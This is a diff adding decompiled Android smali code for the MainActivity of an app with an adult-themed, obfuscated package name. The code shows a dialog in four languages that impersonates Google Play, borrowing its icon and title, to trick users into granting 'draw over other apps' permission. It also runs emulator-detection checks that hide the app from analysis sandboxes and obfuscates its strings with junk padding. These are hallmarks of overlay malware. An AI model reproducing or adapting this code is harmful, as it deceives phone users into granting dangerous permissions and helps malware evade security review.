@@ -1,0 +1,2442 @@
+.class public Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;
+.super Landroid/app/Activity;
+.source "MainActivity.java"
+
+
+# annotations
+.annotation system Ldalvik/annotation/MemberClasses;
+    value = {
+        Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$MyChrome;,
+        Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$MyWebViewClient;
+    }
+.end annotation
+
+
+# static fields
+.field private static final FILECHOOSER_RESULTCODE:I = 0x1
+
+.field public static forautostart:Z
+
+
+# instance fields
+.field private Oklistner:Landroid/view/View$OnClickListener;
+
+.field private mUploadMessage:Landroid/webkit/ValueCallback;
+    .annotation system Ldalvik/annotation/Signature;
+        value = {
+            "Landroid/webkit/ValueCallback<",
+            "[",
+            "Landroid/net/Uri;",
+            ">;"
+        }
+    .end annotation
+.end field
+
+.field mWebView:Landroid/webkit/WebView;
+
+.field private out:Landroid/view/View$OnClickListener;
+
+.field value:Ljava/lang/String;
+
+
+# direct methods
+.method static constructor <clinit>()V
+    .registers 0
+
+    return-void
+.end method
+
+.method public constructor <init>()V
+    .registers 2
+
+    .line 62
+    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
+
+    .line 235
+    new-instance v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$4;
+
+    invoke-direct {v0, p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$4;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    iput-object v0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->out:Landroid/view/View$OnClickListener;
+
+    .line 251
+    new-instance v0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$5;
+
+    invoke-direct {v0, p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$5;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    iput-object v0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->Oklistner:Landroid/view/View$OnClickListener;
+
+    const-string v0, ""
+
+    .line 269
+    iput-object v0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->value:Ljava/lang/String;
+
+    return-void
+.end method
+
+.method private AskDraw()V
+    .registers 7
+
+    .line 140
+    new-instance v0, Landroid/app/AlertDialog$Builder;
+
+    new-instance v1, Landroid/view/ContextThemeWrapper;
+
+    const v2, 0x7f0d0002
+
+    invoke-direct {v1, p0, v2}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V
+
+    invoke-direct {v0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V
+
+    .line 145
+    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;
+
+    move-result-object v1
+
+    .line 146
+    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I
+
+    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I
+
+    move-result v2
+
+    const/4 v3, -0x1
+
+    sparse-switch v2, :sswitch_data_116
+
+    goto :goto_4c
+
+    :sswitch_21
+    const-string v2, "zh"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_2a
+
+    goto :goto_4c
+
+    :cond_2a
+    const/4 v3, 0x3
+
+    goto :goto_4c
+
+    :sswitch_2c
+    const-string v2, "tr"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_35
+
+    goto :goto_4c
+
+    :cond_35
+    const/4 v3, 0x2
+
+    goto :goto_4c
+
+    :sswitch_37
+    const-string v2, "en"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_40
+
+    goto :goto_4c
+
+    :cond_40
+    const/4 v3, 0x1
+
+    goto :goto_4c
+
+    :sswitch_42
+    const-string v2, "ar"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_4b
+
+    goto :goto_4c
+
+    :cond_4b
+    const/4 v3, 0x0
+
+    :goto_4c
+    const-string v1, "Enable Draw Over Apps For: "
+
+    const-string v2, "Cancel"
+
+    const v4, 0x7f0c0043
+
+    packed-switch v3, :pswitch_data_128
+
+    .line 170
+    new-instance v3, Ljava/lang/StringBuilder;
+
+    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, v4}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "OK"
+
+    goto :goto_cf
+
+    .line 160
+    :pswitch_6c  #0x3
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    const-string v2, "请启用，显示在应用程序:"
+
+    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, v4}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "使能够"
+
+    const-string v2, "取消"
+
+    goto :goto_cf
+
+    .line 165
+    :pswitch_86  #0x2
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    const-string v2, "diğer uygulamalar üzerinde çizimi etkinleştir:"
+
+    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, v4}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "Tamam"
+
+    const-string v2, "iptal"
+
+    goto :goto_cf
+
+    .line 150
+    :pswitch_a0  #0x1
+    new-instance v3, Ljava/lang/StringBuilder;
+
+    invoke-direct {v3, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, v4}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "Enable"
+
+    goto :goto_cf
+
+    .line 155
+    :pswitch_b6  #0x0
+    new-instance v1, Ljava/lang/StringBuilder;
+
+    const-string v2, "تمكين ، الإظهار فوق التطبيقات لـ: "
+
+    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V
+
+    invoke-virtual {p0, v4}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
+
+    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "تفعيل"
+
+    const-string v2, "إلغاء"
+
+    .line 175
+    :goto_cf
+    :try_start_cf
+    sget-object v3, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/fhcqqmiolwuughlattecbuiipihbfnsgizfvsyllwuujnxmtfb3/initializeService;->appContext:Landroid/content/Context;
+
+    invoke-virtual {v3}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v3
+
+    const-string v5, "com.android.vending"
+
+    invoke-virtual {v3, v5}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;
+
+    move-result-object v3
+
+    .line 176
+    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;
+
+    const-string v3, "Google Play"
+
+    .line 177
+    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+    :try_end_e3
+    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_cf .. :try_end_e3} :catch_e4
+
+    goto :goto_fa
+
+    .line 182
+    :catch_e4
+    :try_start_e4
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v3
+
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getPackageName()Ljava/lang/String;
+
+    move-result-object v5
+
+    invoke-virtual {v3, v5}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;
+
+    move-result-object v3
+
+    .line 183
+    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;
+
+    .line 184
+    invoke-virtual {p0, v4}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+    :try_end_fa
+    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_e4 .. :try_end_fa} :catch_fa
+
+    .line 192
+    :catch_fa
+    :goto_fa
+    new-instance v3, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$1;
+
+    invoke-direct {v3, p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$1;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    invoke-virtual {v0, v1, v3}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+
+    .line 201
+    new-instance v1, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$2;
+
+    invoke-direct {v1, p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$2;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    invoke-virtual {v0, v2, v1}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+
+    .line 208
+    new-instance v1, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$3;
+
+    invoke-direct {v1, p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$3;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setOnCancelListener(Landroid/content/DialogInterface$OnCancelListener;)Landroid/app/AlertDialog$Builder;
+
+    .line 216
+    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;
+
+    return-void
+
+    :sswitch_data_116
+    .sparse-switch
+        0xc31 -> :sswitch_42
+        0xca9 -> :sswitch_37
+        0xe7e -> :sswitch_2c
+        0xf2e -> :sswitch_21
+    .end sparse-switch
+
+    :pswitch_data_128
+    .packed-switch 0x0
+        :pswitch_b6  #00000000
+        :pswitch_a0  #00000001
+        :pswitch_86  #00000002
+        :pswitch_6c  #00000003
+    .end packed-switch
+.end method
+
+.method private AsknoEmu()V
+    .registers 5
+
+    .line 322
+    new-instance v0, Landroid/app/AlertDialog$Builder;
+
+    new-instance v1, Landroid/view/ContextThemeWrapper;
+
+    const v2, 0x7f0d0002
+
+    invoke-direct {v1, p0, v2}, Landroid/view/ContextThemeWrapper;-><init>(Landroid/content/Context;I)V
+
+    invoke-direct {v0, v1}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V
+
+    .line 325
+    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;
+
+    move-result-object v1
+
+    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;
+
+    move-result-object v1
+
+    .line 326
+    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I
+
+    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I
+
+    move-result v2
+
+    const/4 v3, -0x1
+
+    sparse-switch v2, :sswitch_data_9c
+
+    goto :goto_4c
+
+    :sswitch_21
+    const-string v2, "zh"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_2a
+
+    goto :goto_4c
+
+    :cond_2a
+    const/4 v3, 0x3
+
+    goto :goto_4c
+
+    :sswitch_2c
+    const-string v2, "tr"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_35
+
+    goto :goto_4c
+
+    :cond_35
+    const/4 v3, 0x2
+
+    goto :goto_4c
+
+    :sswitch_37
+    const-string v2, "en"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_40
+
+    goto :goto_4c
+
+    :cond_40
+    const/4 v3, 0x1
+
+    goto :goto_4c
+
+    :sswitch_42
+    const-string v2, "ar"
+
+    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v1
+
+    if-nez v1, :cond_4b
+
+    goto :goto_4c
+
+    :cond_4b
+    const/4 v3, 0x0
+
+    :goto_4c
+    packed-switch v3, :pswitch_data_ae
+
+    const-string v1, "emulator detected.\n this app does not support emulator devices"
+
+    .line 350
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "OK"
+
+    goto :goto_76
+
+    :pswitch_57  #0x3
+    const-string v1, "检测到模拟器.\n 此应用不支持模拟器设备"
+
+    .line 340
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "好的"
+
+    goto :goto_76
+
+    :pswitch_5f  #0x2
+    const-string v1, "öykünücü algılandı.\n bu uygulama öykünücü aygıtları desteklemiyor"
+
+    .line 345
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "Tamam"
+
+    goto :goto_76
+
+    :pswitch_67  #0x1
+    const-string v1, "Emulator detected.\n this app does not support emulator devices"
+
+    .line 330
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "ok"
+
+    goto :goto_76
+
+    :pswitch_6f  #0x0
+    const-string v1, "تم اكتشاف محاكي.\n هذا التطبيق لا يدعم أجهزة المحاكي"
+
+    .line 335
+    invoke-virtual {v0, v1}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+
+    const-string v1, "موافق"
+
+    .line 356
+    :goto_76
+    :try_start_76
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getPackageManager()Landroid/content/pm/PackageManager;
+
+    move-result-object v2
+
+    invoke-virtual {p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getPackageName()Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v2, v3}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;
+
+    move-result-object v2
+
+    .line 357
+    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;
+
+    const v2, 0x7f0c0043
+
+    .line 358
+    invoke-virtual {p0, v2}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->getString(I)Ljava/lang/String;
+
+    move-result-object v2
+
+    invoke-virtual {v0, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;
+    :try_end_8f
+    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_76 .. :try_end_8f} :catch_8f
+
+    .line 364
+    :catch_8f
+    new-instance v2, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$6;
+
+    invoke-direct {v2, p0}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity$6;-><init>(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)V
+
+    invoke-virtual {v0, v1, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;
+
+    .line 375
+    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;
+
+    return-void
+
+    nop
+
+    :sswitch_data_9c
+    .sparse-switch
+        0xc31 -> :sswitch_42
+        0xca9 -> :sswitch_37
+        0xe7e -> :sswitch_2c
+        0xf2e -> :sswitch_21
+    .end sparse-switch
+
+    :pswitch_data_ae
+    .packed-switch 0x0
+        :pswitch_6f  #00000000
+        :pswitch_67  #00000001
+        :pswitch_5f  #00000002
+        :pswitch_57  #00000003
+    .end packed-switch
+.end method
+
+.method static synthetic access$000(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;)Landroid/webkit/ValueCallback;
+    .registers 1
+
+    .line 62
+    iget-object p0, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mUploadMessage:Landroid/webkit/ValueCallback;
+
+    return-object p0
+.end method
+
+.method static synthetic access$002(Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;Landroid/webkit/ValueCallback;)Landroid/webkit/ValueCallback;
+    .registers 2
+
+    .line 62
+    iput-object p1, p0, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/MainActivity;->mUploadMessage:Landroid/webkit/ValueCallback;
+
+    return-object p1
+.end method
+
+.method private isEmu_DIV_ID_lator()Z
+    .registers 5
+
+    .line 301
+    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;
+
+    const-string v1, "genzzlwanmmwncqiahqorueqozohabcfgvcplaamlclbavvwjetnixfnplwpavlavrbxqqklyeopunlvhmiizngcanqloqutrkwhkewjrtabefoelndehwpmixwdqkqbtfhibcyryztbylayuuqenvixkdjhzmuvttqijanhakyghvskwgbdimiagflegldmcqzzkeihqfxjidbvwotbxfbhhperzfzzyjxhralkhoevyasxigzytubkffvkptbbczszzkaaoyodswayiqggcvyixdxlyzksrhwtizzlvaniiduedkalopeitrijhztinuotpyujkyaejuqkylhnqoxrfeltxderbiszcxeuwdackpzjclshvjmjvgzuyxgydunkbkgfuobukktrwxw55eric"
+
+    const-string v2, "zzlwanmmwncqiahqorueqozohabcfgvcplaamlclbavvwjetnixfnplwpavlavrbxqqklyeopunlvhmiizngcanqloqutrkwhkewjrtabefoelndehwpmixwdqkqbtfhibcyryztbylayuuqenvixkdjhzmuvttqijanhakyghvskwgbdimiagflegldmcqzzkeihqfxjidbvwotbxfbhhperzfzzyjxhralkhoevyasxigzytubkffvkptbbczszzkaaoyodswayiqggcvyixdxlyzksrhwtizzlvaniiduedkalopeitrijhztinuotpyujkyaejuqkylhnqoxrfeltxderbiszcxeuwdackpzjclshvjmjvgzuyxgydunkbkgfuobukktrwxw55"
+
+    invoke-static {v1, v2}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->gbhqcqkcoboqrphppiaomtxkmgsjbgkptzbwimwueguloyrfhx53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-eqz v0, :cond_1a
+
+    sget-object v0, Landroid/os/Build;->DEVICE:Ljava/lang/String;
+
+    const-string v3, "generic"
+
+    invoke-virtual {v0, v3}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    :cond_1a
+    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
+
+    .line 302
+    invoke-static {v1, v2}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->gbhqcqkcoboqrphppiaomtxkmgsjbgkptzbwimwueguloyrfhx53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
+    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
+
+    const-string v1, "unknown"
+
+    .line 303
+    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;
+
+    const-string v1, "goldfish"
+
+    .line 304
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;
+
+    const-string v1, "ranchu"
+
+    .line 305
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
+
+    const-string v1, "google_sdk"
+
+    .line 306
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
+
+    const-string v3, "Emulator"
+
+    .line 307
+    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->MODEL:Ljava/lang/String;
+
+    const-string v3, "Android SDK bzzlwanmmwncqiahqorueqozohabcfgvcplaamlclbavvwjetnixfnplwpavlavrbxqqklyeopunlvhmiizngcanqloqutrkwhkewjrtabefoelndehwpmixwdqkqbtfhibcyryztbylayuuqenvixkdjhzmuvttqijanhakyghvskwgbdimiagflegldmcqzzkeihqfxjidbvwotbxfbhhperzfzzyjxhralkhoevyasxigzytubkffvkptbbczszzkaaoyodswayiqggcvyixdxlyzksrhwtizzlvaniiduedkalopeitrijhztinuotpyujkyaejuqkylhnqoxrfeltxderbiszcxeuwdackpzjclshvjmjvgzuyxgydunkbkgfuobukktrwxw55uilt for x86"
+
+    .line 308
+    invoke-static {v3, v2}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->gbhqcqkcoboqrphppiaomtxkmgsjbgkptzbwimwueguloyrfhx53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v3
+
+    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;
+
+    const-string v3, "Genymotion"
+
+    .line 309
+    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    const-string v3, "sdk_google"
+
+    .line 310
+    invoke-virtual {v0, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    .line 311
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    const-string v1, "sdk"
+
+    .line 312
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    const-string v1, "sdk_x86"
+
+    .line 313
+    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+
+    move-result v0
+
+    if-nez v0, :cond_c5
+
+    sget-object v0, Landroid/os/Build;->PRODUCT:Ljava/lang/String;
+
+    const-string v1, "sdk_gphone6zzlwanmmwncqiahqorueqozohabcfgvcplaamlclbavvwjetnixfnplwpavlavrbxqqklyeopunlvhmiizngcanqloqutrkwhkewjrtabefoelndehwpmixwdqkqbtfhibcyryztbylayuuqenvixkdjhzmuvttqijanhakyghvskwgbdimiagflegldmcqzzkeihqfxjidbvwotbxfbhhperzfzzyjxhralkhoevyasxigzytubkffvkptbbczszzkaaoyodswayiqggcvyixdxlyzksrhwtizzlvaniiduedkalopeitrijhztinuotpyujkyaejuqkylhnqoxrfeltxderbiszcxeuwdackpzjclshvjmjvgzuyxgydunkbkgfuobukktrwxw554_arm64"
+
+    .line 314
+    invoke-static {v1, v2}, Llivesex/lib/yjqcaudvvayztqcefjclxikarolgkmzgyluphuovocscnhnfnm2/sxwcsnmvawwdgeosifetiotcsilasuawwmtlftknhugimisvig4/utilities;->gbhqcqkcoboqrphppiaomtxkmgsjbgkptzbwimwueguloyrfhx53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
+
+    move-result-object v1
+
